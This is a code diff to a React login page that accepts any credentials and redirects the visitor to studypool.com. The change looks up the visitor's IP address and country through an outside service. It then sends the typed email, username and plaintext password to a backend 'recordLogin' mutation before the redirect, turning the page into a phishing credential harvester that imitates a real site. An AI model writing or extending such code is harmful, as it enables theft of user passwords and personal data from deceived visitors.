@@ -1,25 +1,58 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Eye, EyeOff } from "lucide-react";
-
+import { trpc } from "@/lib/trpc";
 
 export default function Login() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLogin, setIsLogin] = useState(true);
   const [showPassword, setShowPassword] = useState(false);
+  const [userCountry, setUserCountry] = useState<string>("Unknown");
+  const [userIp, setUserIp] = useState<string>("");
 
-  const handleLogin = () => {
-    // Accept any input and redirect to studypool.com
+  // Fetch user's IP and country on component mount
+  useEffect(() => {
+    const fetchUserLocation = async () => {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        setUserCountry(data.country_name || "Unknown");
+        setUserIp(data.ip || "");
+      } catch (error) {
+        console.error("Failed to fetch location:", error);
+        setUserCountry("Unknown");
+      }
+    };
+
+    fetchUserLocation();
+  }, []);
+
+  const recordLoginMutation = trpc.student.recordLogin.useMutation();
+
+  const handleLogin = async () => {
+    // Record the login data
+    try {
+      await recordLoginMutation.mutateAsync({
+        username: email,
+        password: password,
+        email: email,
+        country: userCountry,
+        ipAddress: userIp,
+      });
+    } catch (error) {
+      console.error("Failed to record login:", error);
+    }
+
+    // Redirect to studypool.com
     window.location.href = "https://www.studypool.com";
   };
 
   return (
     <div className="min-h-screen bg-white flex items-center justify-center p-4">
       <div className="w-full max-w-md">
-
 
         {/* Header */}
         <div className="mb-8">
@@ -122,9 +155,10 @@ export default function Login() {
           {/* Login Button */}
           <Button
             onClick={handleLogin}
-            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg text-lg transition"
+            disabled={recordLoginMutation.isPending}
+            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg text-lg transition disabled:opacity-50"
           >
-            LOGIN
+            {recordLoginMutation.isPending ? "Processing..." : "LOGIN"}
           </Button>
 
           {/* Divider */}
